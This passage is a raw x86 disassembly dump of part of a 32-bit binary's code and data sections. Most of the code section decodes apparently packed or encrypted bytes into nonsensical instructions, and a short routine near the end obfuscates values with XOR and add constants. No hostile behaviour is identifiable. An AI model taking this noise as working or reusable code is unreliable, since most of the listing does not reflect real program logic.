  411a79:	fistp  DWORD PTR [eax]
  411a7b:	test   BYTE PTR [esp+ecx*2],ch
  411a7e:	loope  0x411a30
  411a80:	dec    edi
  411a81:	and    eax,0x288fc4aa
  411a86:	repz sub BYTE PTR [ebx],dl
  411a89:	cmp    eax,DWORD PTR [ebx+0x2cbf722a]
  411a8f:	add    eax,0x3e048db0
  411a94:	and    BYTE PTR [ebx],bl
  411a96:	sub    ch,ch
  411a98:	fmul   QWORD PTR [ecx+0x62]
  411a9b:	fist   DWORD PTR ds:0x74cd427e
  411aa1:	adc    ebp,DWORD PTR [edx+ecx*1-0x48]
  411aa5:	sub    bh,BYTE PTR [ecx-0x6a156d1b]
  411aab:	mov    al,ds:0xc8455ee
  411ab0:	stc    
  411ab1:	adc    BYTE PTR [ebx],dl
  411ab3:	mov    esp,0xcece9208
  411ab8:	ja     0x411ae5
  411aba:	adc    BYTE PTR [ecx-0x1d],cl
  411abd:	xor    eax,0x9c12d917
  411ac2:	xchg   ebp,eax
  411ac3:	div    BYTE PTR [edx]
  411ac5:	sbb    dh,ch
  411ac7:	ss jmp 0x411adf
  411aca:	pop    edi
  411acb:	add    dl,ah
  411acd:	stos   DWORD PTR es:[edi],eax
  411ace:	pop    DWORD PTR [edi-0x4b5faf07]
  411ad4:	clc    
  411ad5:	cwde   
  411ad6:	mov    fs,WORD PTR [ebp+0x2a706379]
  411adc:	xchg   ebx,eax
  411add:	faddp  st(4),st
  411adf:	stos   BYTE PTR es:[edi],al
  411ae0:	inc    ecx
  411ae1:	push   ecx
  411ae2:	push   ds
  411ae3:	(bad)  
  411ae4:	cmc    
  411ae5:	sub    bh,BYTE PTR [edi+eax*2]
  411ae8:	jnp    0x411b32
  411aea:	in     eax,0x96
  411aec:	pop    ecx
  411aed:	jnp    0x411b1e
  411aef:	jg     0x411b40
  411af1:	lods   al,BYTE PTR ds:[esi]
  411af2:	pop    es
  411af3:	xor    al,0x60
  411af5:	sar    BYTE PTR [edi+eax*1-0x58c5ba39],0x7f
  411afd:	pop    esi
  411afe:	test   BYTE PTR [ecx+eax*2-0x2f858fe5],ah
  411b05:	inc    esp
  411b06:	loopne 0x411b2c
  411b08:	adc    al,0xf7
  411b0a:	stos   DWORD PTR es:[edi],eax
  411b0b:	lea    esi,[esi+ebp*4-0x41239958]
  411b12:	shr    DWORD PTR [esp],1
  411b15:	adc    BYTE PTR [ecx+0x3dbb25cf],cl
  411b1b:	out    0x7e,eax
  411b1d:	adc    BYTE PTR [edx-0x67],ah
  411b20:	(bad)  
  411b21:	xchg   esi,eax
  411b22:	xor    DWORD PTR [eax-0x7f9c4169],esp
  411b28:	cmp    ch,BYTE PTR [edx]
  411b2a:	or     eax,0x982d704a
  411b2f:	int    0xf9
  411b31:	jmp    0x411b2f
  411b33:	sbb    dh,dh
  411b35:	or     dl,dl
  411b37:	pop    ebp
  411b38:	push   ds
  411b39:	push   eax
  411b3a:	out    dx,al
  411b3b:	jnp    0x411b6d
  411b3d:	mov    cs,WORD PTR [esi+0x2aaf961e]
  411b43:	test   ebp,ebx
  411b45:	jmp    0xc35671bd
  411b4a:	dec    esi
  411b4b:	xchg   BYTE PTR [ebp+0xbdb2926],bh
  411b51:	nop
  411b52:	inc    esi
  411b53:	xor    edx,DWORD PTR [ecx+0x26223c8a]
  411b59:	mov    ch,0x81
  411b5b:	inc    ebp
  411b5c:	push   eax
  411b5d:	rcl    DWORD PTR [edi+ebp*2-0x3a],cl
  411b61:	int3   
  411b62:	leave  
  411b63:	ret    
  411b64:	add    eax,0x2e5db700
  411b69:	enter  0x1915,0x9f
  411b6d:	sub    eax,0x1010287e
  411b72:	bound  edi,QWORD PTR [edi+0x1d]
  411b75:	jle    0x411b96
  411b77:	jle    0x411b6a
  411b79:	gs leave 
  411b7b:	into   
  411b7c:	mov    ds:0xb3ee53e3,eax
  411b81:	push   ebp
  411b82:	jb     0x411b39
  411b84:	lds    esp,FWORD PTR [ebx-0x311ec090]
  411b8a:	mov    ds:0x145223cc,al
  411b8f:	sbb    al,dh
  411b91:	xor    eax,0x88effb6a
  411b96:	and    eax,0x7098aeba
  411b9b:	pop    ebx
  411b9c:	sub    DWORD PTR [ebx+0x11],edi
  411b9f:	clc    
  411ba0:	mov    esi,0xa10c0c03
  411ba5:	push   ebx
  411ba6:	mov    ah,0x8c
  411ba8:	jmp    0xd396280
  411bad:	(bad)  
  411bae:	adc    al,0x98
  411bb0:	leave  
  411bb1:	jmp    0x6e991e73
  411bb6:	mov    ch,0xf6
  411bb8:	add    sp,ax
  411bbb:	test   al,0x63
  411bbd:	sbb    al,0x60
  411bbf:	ds icebp 
  411bc1:	xor    DWORD PTR [esi+0x5c],esp
  411bc4:	jne    0x411b79
  411bc6:	ret    
  411bc7:	inc    edi
  411bc8:	adc    eax,ebx
  411bca:	dec    eax
  411bcb:	cs inc eax
  411bcd:	mov    esp,0xa34a98ce
  411bd2:	jnp    0x411c40
  411bd4:	lods   al,BYTE PTR ds:[esi]
  411bd5:	xchg   esp,eax
  411bd6:	scas   al,BYTE PTR es:[edi]
  411bd7:	xor    al,0x9
  411bd9:	dec    esi
  411bda:	(bad)  
  411bdb:	(bad)  
  411bdc:	fst    QWORD PTR [ebx]
  411bde:	cmp    cl,BYTE PTR [edx-0x16]
  411be1:	cwde   
  411be2:	int3   
  411be3:	shl    BYTE PTR [esi],1
  411be5:	push   es
  411be6:	cmp    al,0xa5
  411be8:	adc    BYTE PTR [esi],cl
  411bea:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bec:	add    BYTE PTR [esi-0x22],ch
  411bef:	sbb    al,0x6b
  411bf1:	pop    eax
  411bf2:	push   edx
  411bf3:	in     al,dx
  411bf4:	pop    edx
  411bf5:	and    al,0x16
  411bf7:	lock mov WORD PTR [eax-0x55],ds
  411bfb:	push   edi
  411bfc:	pop    esi
  411bfd:	add    DWORD PTR [ecx+0x68],ecx
  411c00:	cmp    BYTE PTR [edi+0x3e5842ea],0x7e
  411c07:	loope  0x411c75
  411c09:	scas   al,BYTE PTR es:[edi]
  411c0a:	mov    esi,0x4c776e43
  411c0f:	es addr16 test al,0x59
  411c13:	daa    
  411c14:	pop    esp
  411c15:	push   es
  411c16:	mov    ebx,DWORD PTR [ebp-0x42003041]
  411c1c:	repz xor BYTE PTR [esi+ebx*1+0x2c981a30],bl
  411c24:	add    ebp,esp
  411c26:	add    ebx,edi
  411c28:	mov    ah,0x6d
  411c2a:	cmp    BYTE PTR [ecx-0x2277c448],cl
  411c30:	retf   0x66f1
  411c33:	mov    DWORD PTR ds:0x4a9c2e84,esi
  411c39:	mov    DWORD PTR [esi+ecx*4],edi
  411c3c:	xor    eax,edx
  411c3e:	push   esi
  411c3f:	mov    esi,DWORD PTR [ebp+0x8]
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x9adad6c4
  411c5b:	sahf   
  411c5c:	adc    al,0x5c
  411c5e:	(bad)  
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	or     ebx,DWORD PTR [esi]
  411c68:	xchg   edi,eax
  411c69:	push   edi
  411c6a:	or     al,0x24
  411c6c:	dec    ecx
  411c6d:	test   BYTE PTR [ebx+ecx*4+0x58],0x98
  411c72:	jecxz  0x411c7f
  411c74:	xchg   bx,ax
  411c76:	iret   
  411c77:	(bad)  
  411c78:	sar    BYTE PTR ds:0x23f74c53,cl
  411c7e:	stos   BYTE PTR es:[edi],al
  411c7f:	xchg   esp,eax
  411c80:	or     ah,BYTE PTR [ecx-0x2f316715]
  411c86:	jg     0x411cf1
  411c88:	inc    ebp
  411c89:	jae    0x411c56
  411c8b:	sub    ah,dl
  411c8d:	aad    0xfa
  411c8f:	jno    0x411c9a
  411c91:	cdq    
  411c92:	push   cs
  411c93:	ror    BYTE PTR [ebp+ebp*2+0x4],1
  411c97:	cmp    ebp,DWORD PTR [esi-0x4c]
  411c9a:	and    al,0x89
  411c9c:	mov    ch,0xcd
  411c9e:	mov    ebp,0x542332e6
  411ca3:	rcl    DWORD PTR [esi+eax*1-0x41],1
  411ca7:	sti    
  411ca8:	push   esp
  411ca9:	pop    esi
  411caa:	mov    esp,0xa4b4c2f8
  411caf:	jno    0x411c7a
  411cb1:	lods   eax,DWORD PTR ds:[esi]
  411cb2:	jecxz  0x411d12
  411cb4:	pop    ss
  411cb5:	inc    edx
  411cb6:	add    eax,0x1f7f7667
  411cbb:	add    ah,bl
  411cbd:	xor    BYTE PTR [eax+ecx*8],ch
  411cc0:	imul   ebp,DWORD PTR [esi+0x2e],0x49
  411cc4:	leave  
  411cc5:	fs in  eax,dx
  411cc7:	repnz cld 
  411cc9:	or     eax,0xf88df40c
  411cce:	or     DWORD PTR [esp+ebx*1+0x68],esp
  411cd2:	push   0xbdf4079b
  411cd7:	loope  0x411cc7
  411cd9:	enter  0x1e95,0x2f
  411cdd:	icebp  
  411cde:	stos   DWORD PTR es:[edi],eax
  411cdf:	bound  edx,QWORD PTR es:[esp+edi*4]
  411ce3:	push   esp
  411ce4:	std    
  411ce5:	lods   eax,DWORD PTR ds:[esi]
  411ce6:	jo     0x411d25
  411ce8:	sahf   
  411ce9:	xor    BYTE PTR [eax*8+0x3a4e5d43],dh
  411cf0:	int    0xfa
  411cf2:	mov    eax,ds:0x39a65357
  411cf7:	or     eax,0xc5a9e750
  411cfc:	rcr    BYTE PTR [esi+0x176d6bb3],cl
  411d02:	or     BYTE PTR [ebp+0x234e808f],dl
  411d08:	push   ds
  411d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d0a:	sbb    esi,0xd71c715d
  411d10:	imul   ebp,DWORD PTR [edx],0xffffffb6
  411d13:	pop    es
  411d14:	outs   dx,DWORD PTR ds:[esi]
  411d15:	jecxz  0x411d17
  411d17:	xchg   edx,eax
  411d18:	xlat   BYTE PTR ds:[ebx]
  411d19:	test   ch,ah
  411d1b:	pop    ss
  411d1c:	pop    es
  411d1d:	mov    ebx,DWORD PTR [ebp-0xa8f3e26]
  411d23:	into   
  411d24:	xor    ecx,DWORD PTR [esi+0x5e742c10]
  411d2a:	xor    ch,BYTE PTR [ebx+0x24056752]
  411d30:	inc    edi
  411d31:	mov    edx,0x77c84fde
  411d36:	out    0x2,al
  411d38:	or     BYTE PTR [esi],ah
  411d3a:	cld    
  411d3b:	and    BYTE PTR [ecx],0xdf
  411d3e:	mov    BYTE PTR [ebp-0x14f8c6d1],al
  411d44:	cld    
  411d45:	shr    DWORD PTR [ecx+0x3647b83e],1
  411d4b:	jecxz  0x411d4c
  411d4d:	in     al,0xe7
  411d4f:	mov    ch,0xb5
  411d51:	jge    0x411d92
  411d53:	mov    dh,0xa3
  411d55:	in     eax,dx
  411d56:	mov    ss,WORD PTR [eax]
  411d58:	out    dx,al
  411d59:	into   
  411d5a:	pop    eax
  411d5b:	mov    al,ds:0xf2502ace
  411d60:	add    BYTE PTR [edi+0x75611ba8],al
  411d66:	enter  0x343e,0x61
  411d6a:	xchg   ebx,eax
  411d6b:	popf   
  411d6c:	mov    esi,0x82ee078f
  411d71:	inc    ebp
  411d72:	sub    eax,0x1f22a54b
  411d77:	js     0x411d6a
  411d79:	cli    
  411d7a:	adc    ecx,DWORD PTR [esi]
  411d7c:	pusha  
  411d7d:	leave  
  411d7e:	and    DWORD PTR [eax],ecx
  411d80:	pop    ebp
  411d81:	sbb    DWORD PTR [edi],edx
  411d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d84:	cwde   
  411d85:	push   es
  411d86:	cld    
  411d87:	lods   al,BYTE PTR ds:[esi]
  411d88:	dec    ebx
  411d89:	or     DWORD PTR [esi+0x2c],edx
  411d8c:	(bad)  [edx]
  411d8e:	jmp    0x7cd0:0x9bcf5bf3
  411d95:	xor    eax,0xcc05b597
  411d9a:	loope  0x411d43
  411d9c:	sub    al,0x56
  411d9e:	loopne 0x411dab
  411da0:	mov    esi,0xf8246174
  411da5:	fidivr DWORD PTR [esi+0x0]
  411da8:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411daa:	fisttp QWORD PTR [esi-0x702717ef]
  411db0:	xchg   BYTE PTR [ebx-0x3aaa6f1a],bl
  411db6:	dec    esp
  411db7:	jl     0x411e00
  411db9:	adc    esi,ecx
  411dbb:	sub    DWORD PTR [eax+edi*4-0x3123994],esi
  411dc2:	pop    ds
  411dc3:	aad    0x29
  411dc5:	loopne 0x411dc2
  411dc7:	xor    ax,0xf190
  411dcb:	dec    ebp
  411dcc:	rol    BYTE PTR [edx+0x7f],1
  411dcf:	in     al,dx
  411dd0:	mov    ecx,0xee239ac9
  411dd5:	je     0x411d88
  411dd7:	lds    esp,FWORD PTR [ecx]
  411dd9:	xchg   ecx,eax
  411dda:	leave  
  411ddb:	inc    edi
  411ddc:	sbb    DWORD PTR [ebp-0x56],edx
  411ddf:	fcmovnbe st,st(5)
  411de1:	aad    0xa4
  411de3:	push   ecx
  411de4:	mov    bh,0x34
  411de6:	sub    BYTE PTR [ebp+ebp*2-0x7dc0b300],bl
  411ded:	jge    0x411d72
  411def:	push   ebp
  411df0:	jle    0x411dc1
  411df2:	sahf   
  411df3:	imul   edx,DWORD PTR [edx+0x774daf04],0xffffff98
  411dfa:	sbb    edi,esp
  411dfc:	adc    DWORD PTR [edx],edi
  411dfe:	sub    ah,BYTE PTR [esi]
  411e00:	pop    ss
  411e01:	outs   dx,DWORD PTR ds:[esi]
  411e02:	and    al,0xc5
  411e04:	test   BYTE PTR [esi+0x4321f8c2],dl
  411e0a:	jno    0x411e04
  411e0c:	jb     0x411e5d
  411e0e:	xor    eax,0x83b2e21e
  411e13:	into   
  411e14:	popf   
  411e15:	ins    BYTE PTR es:[edi],dx
  411e16:	cs shl ebp,1
  411e19:	pop    ss
  411e1a:	out    dx,al
  411e1b:	pop    ecx
  411e1c:	jae    0x411dc2
  411e1e:	mov    WORD PTR [ebp+0x4c],ss
  411e21:	sbb    DWORD PTR [ebx+ebp*8+0x78],edx
  411e25:	mov    ch,0xc5
  411e27:	fucomi st,st(6)
  411e29:	sbb    eax,0x29210fa3
  411e2e:	adc    al,BYTE PTR [ebx]
  411e30:	mov    bh,0xaa
  411e32:	jmp    0x9446:0xf10071e4
  411e39:	dec    esi
  411e3a:	mov    edx,0x4f49e9b9
  411e3f:	(bad)  
  411e40:	out    0xdf,al
  411e42:	jle    0x411e44
  411e44:	adc    eax,0x30d126b3
  411e49:	js     0x411e84
  411e4b:	adc    eax,DWORD PTR [edi-0x472eeca4]
  411e51:	mov    dl,0xbd
  411e53:	sub    al,0xd0
  411e55:	jno    0x411e75
  411e57:	jns    0x411e99
  411e59:	mov    bl,ch
  411e5b:	mov    edi,0xe7fea2c
  411e60:	inc    ebx
  411e61:	retf   
  411e62:	inc    ecx
  411e63:	mov    cl,0x88
  411e65:	rol    DWORD PTR [eax-0x3e6ea8d9],cl
  411e6b:	test   DWORD PTR [ebp-0x2d],esi
  411e6e:	lea    esp,[ebp+ebp*4-0x1c]
  411e72:	fwait
  411e73:	dec    eax
  411e74:	fwait
  411e75:	enter  0x9243,0x2c
  411e79:	mov    ds:0xf91dc326,al
  411e7e:	xor    eax,0x934c0b60
  411e83:	and    eax,0x5e544639
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
